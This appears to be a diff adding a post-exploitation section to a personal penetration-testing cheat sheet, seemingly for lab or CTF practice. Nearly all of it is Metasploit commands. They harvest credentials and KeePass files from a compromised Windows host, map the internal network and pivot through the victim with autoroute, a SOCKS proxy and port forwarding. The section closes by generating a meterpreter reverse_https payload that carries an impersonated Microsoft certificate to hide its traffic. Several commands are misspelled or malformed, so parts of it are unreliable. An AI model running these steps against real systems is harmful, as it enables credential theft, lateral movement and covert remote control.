@@ -874,3 +874,69 @@ snmpwalk -v 1 -c public 10.10.10.20
 hydra -L users.txt -P /usr/share/john/password.lst 10.10.10.20 smb -f -V
 With user/pass /home/bruiser/impacket/examples/psexec.py
 ```
+# POST
+```bash
+meterpreter > run post/windows/gather/enum_applications
+meterpreter > run post/windows/gather/credentials/winscp
+meterpreter > run post/windows/gather/credential_collector
+meterpreter > search -f *kdb -r -d .
+meterpreter > screenshot
+```
+##### Maping the Internal Network
+```bash
+arp
+route
+ipconfig /displaydns
+netstat -ano
+use /post/multi/gather/ping_sweet
+run arp_scanner -r 10.10.10.0/24
+
+USE THE EXPLOITED MACHINE AS A BRIDGE
+use post/windows/manage/autoroute
+route print
+use auxiliary/server/socks4a
+
+sudo nano /etc/proxychains.conf
+(last line) socks4 127.0.0.1 1080
+proxychains iceweasel (for browser)
+
+ADD PORT FORWARD RULE
+meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.200 (or whatever you want to get to)
+```
+
+### MAchine cant reach back over internet
+```bash
+use post/windows/manage/autoroute
+set session 1
+set subnet 10.10.11.0
+run
+use post/windows/manage/autoroute
+set subnet 10.10.10.0
+run
+route print
+Active Routing Table
+====================
+
+ Subnet          Netmask          Gateway
+ ------          -------          -------
+ 10.10.10.0      255.255.255.0    Session 1
+ 10.10.11.0      255.255.255.0    Session 1
+
+Now cahnge LHOST to vicim 1
+```
+##### Custom SSL Meterpreter
+```bash
+use auxiliary/gather/impersonate_ssl
+set rhost www.microsoft.com
+Copy path to the .pem file
+use payload/windows/x64/meterpreter/reverse_https
+set handlersscert ctrl c the path to the .pem file
+set stagerverifysslcert true
+generate -t exe -f /root/ssl_payload.exe
+
+use exploit/multi/handler
+set handlersscert ctrl c path to .pem
+set stagerverifysslcert true
+set payload windows/x64.meterpreter/reverse_https
+
+```
